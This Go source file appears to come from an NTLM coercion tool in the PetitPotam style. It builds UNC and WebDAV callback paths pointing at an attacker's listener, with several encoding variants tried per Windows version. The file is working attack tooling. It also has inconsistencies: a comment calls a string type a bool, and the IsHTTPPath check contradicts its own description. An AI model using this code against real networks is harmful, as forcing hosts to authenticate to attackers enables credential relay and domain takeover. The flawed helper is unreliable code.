package callback

import (
	"strings"
)

// Mode mirrors config.Mode via a functional string to avoid an import cycle
// (config and callback must not depend on one another). The CLI wires the two
// together. A plain bool keeps the coupling minimal.
type Mode string

const (
	// UNC selects \\listener\share\file path forms.
	UNC Mode = "unc"
	// HTTP selects WebDAV \\host@80/path forms.
	HTTP Mode = "http"
)

// PathService builds callback paths for a given listener. It owns all the
// Windows WebDAV / UNC naming conventions that were previously spread across
// the original main file and the individual methods.
type PathService struct {
	Listener string
	Mode     Mode
}

// New returns a PathService bound to the listener and mode.
func New(listener string, mode Mode) *PathService {
	return &PathService{Listener: listener, Mode: mode}
}

// Build produces a single callback path (NULL-terminated) suitable for a
// coercion method's UNC-string parameter. When shareName/fileName are both
// empty the service falls back to the proven default form for the mode.
func (p *PathService) Build(shareName, fileName string) string {
	if p.Mode == HTTP {
		host := p.Listener
		if !strings.Contains(host, "@") {
			host = host + "@80"
		}
		path := "\\\\" + host
		if shareName == "" && fileName == "" {
			path += "\\test\\Settings.ini"
		} else {
			if shareName != "" {
				path += "\\" + shareName
			}
			if fileName != "" {
				path += "\\" + fileName
			}
		}
		return path + "\x00"
	}

	path := "\\\\" + p.Listener
	if shareName != "" {
		path += "\\" + shareName
	}
	if fileName != "" {
		path += "\\" + fileName
	}
	return path + "\x00"
}

// Variations returns the set of path forms to try for a callback. Different
// Windows versions respond to different path encodings, so for PetitPotam we
// iterate all of them.
func (p *PathService) Variations() []string {
	if p.Mode == HTTP {
		return p.httpVariations()
	}
	return []string{
		"\\\\" + p.Listener + "\\test\\file.txt\x00",
		"\\\\" + p.Listener + "\\test\\\x00",
		"\\\\" + p.Listener + "\\test\x00",
	}
}

func (p *PathService) httpVariations() []string {
	host80 := p.Listener
	if !strings.Contains(host80, "@") {
		host80 = host80 + "@80"
	}
	hostSSL := p.Listener
	if !strings.Contains(hostSSL, "@") {
		hostSSL = hostSSL + "@SSL@443"
	}

	return []string{
		"\\\\" + host80 + "\\test\\Settings.ini\x00", // Exact PetitPotam.py format
		"\\\\" + host80 + "/test\\Settings.ini\x00",  // Mixed slashes
		"\\\\" + host80 + "/test/Settings.ini\x00",   // All forward slashes
		"\\\\" + host80 + "/DavWWWRoot/test.txt\x00",
		"\\\\" + host80 + "/test/file.txt\x00",
		"\\\\" + host80 + "/test\x00",
		"\\\\" + hostSSL + "/DavWWWRoot/test.txt\x00",
		"\\\\" + hostSSL + "/test/file.txt\x00",
		"\\\\" + host80 + "/share\x00",
	}
}

// AutoWebDAV appends the conventional @80/test suffix to a bare host so that
// the user can pass just an IP or hostname in HTTP mode.
func AutoWebDAV(host string) string {
	return host + "@80/test"
}

// IsHTTPPath reports whether the path uses the forward-slash WebDAV form,
// which is a useful sanity check before sending.
func IsHTTPPath(path string) bool {
	return strings.Contains(path, "@") && !strings.Contains(path, "/")
}
